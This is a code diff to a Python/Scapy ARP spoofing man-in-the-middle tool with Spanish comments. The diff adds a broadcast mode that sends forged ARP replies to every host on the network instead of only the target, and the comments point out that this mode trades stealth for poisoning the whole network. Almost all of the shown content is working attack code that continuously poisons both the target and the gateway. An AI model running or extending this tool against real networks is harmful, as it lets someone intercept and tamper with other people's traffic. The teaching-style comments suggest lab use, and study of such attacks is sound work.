@@ -74,7 +74,7 @@ def get_mac(ip, iface, timeout=2):
         sys.exit(1)
 
 
-def spoof(target_ip, target_mac, spoof_ip, iface):
+def spoof(target_ip, target_mac, spoof_ip, iface, broadcast=False):
     """
     Envia un ARP Reply falso al target diciendole que la IP de spoof_ip
     esta asociada a NUESTRA MAC (la del atacante).
@@ -84,12 +84,20 @@ def spoof(target_ip, target_mac, spoof_ip, iface):
       Despues: spoof_ip -> MAC_del_atacante
 
     El target enviara su trafico destinado a spoof_ip hacia nosotros.
+
+    Modos:
+      - Unicast (default): Solo el target recibe el ARP Reply falso.
+        Mas sigiloso, pero solo envenena al host objetivo.
+      - Broadcast (--broadcast): Todos los hosts de la red reciben el
+        ARP Reply falso. Menos sigiloso pero envenena a toda la red
+        simultáneamente. Herramientas como Ettercap usan este modo.
     """
     # =========================================================================
     # Paquete ARP Reply FALSO (el corazon del ataque)
     # =========================================================================
     # Capa 2 - Ethernet
-    #   dst = target_mac           -> Solo el target recibe este paquete
+    #   dst = target_mac           -> Unicast: solo el target recibe
+    #   dst = "ff:ff:ff:ff:ff:ff"  -> Broadcast: toda la red recibe
     #   src = nuestra MAC          -> MAC del atacante (auto por Scapy)
     #
     # Capa 2.5 - ARP
@@ -101,7 +109,8 @@ def spoof(target_ip, target_mac, spoof_ip, iface):
     #
     # RESULTADO: El target cree que spoof_ip esta en nuestra MAC
     # =========================================================================
-    pkt = Ether(dst=target_mac) / ARP(
+    eth_dst = "ff:ff:ff:ff:ff:ff" if broadcast else target_mac
+    pkt = Ether(dst=eth_dst) / ARP(
         op="is-at",        # ARP Reply
         pdst=target_ip,    # A quien va dirigido el engaño
         hwdst=target_mac,  # MAC real del objetivo
@@ -172,7 +181,11 @@ Ejemplos:
                         help="Interfaz de red (default: eth0)")
     parser.add_argument("--interval", type=float, default=2.0,
                         help="Intervalo entre paquetes ARP en segundos (default: 2)")
+    parser.add_argument("--broadcast", action="store_true",
+                        help="Enviar ARP Replies en broadcast (toda la red los recibe)")
     args = parser.parse_args()
+
+    mode = "Broadcast (toda la red)" if args.broadcast else "Unicast (solo objetivos)"
 
     print("=" * 60)
     print("  ARP Spoofing - Man in the Middle Attack")
@@ -181,6 +194,7 @@ Ejemplos:
     print(f"  Gateway:   {args.gateway}")
     print(f"  Interface: {args.interface}")
     print(f"  Intervalo: {args.interval}s")
+    print(f"  Modo:      {mode}")
     print("=" * 60)
 
     # Obtener nuestra MAC
@@ -215,9 +229,9 @@ Ejemplos:
     try:
         while True:
             # Envenenar al target: "El gateway soy yo"
-            spoof(args.target, target_mac, args.gateway, args.interface)
+            spoof(args.target, target_mac, args.gateway, args.interface, args.broadcast)
             # Envenenar al gateway: "El target soy yo"
-            spoof(args.gateway, gateway_mac, args.target, args.interface)
+            spoof(args.gateway, gateway_mac, args.target, args.interface, args.broadcast)
 
             pkt_count += 2
             print(f"\r[*] Paquetes ARP enviados: {pkt_count}", end="", flush=True)
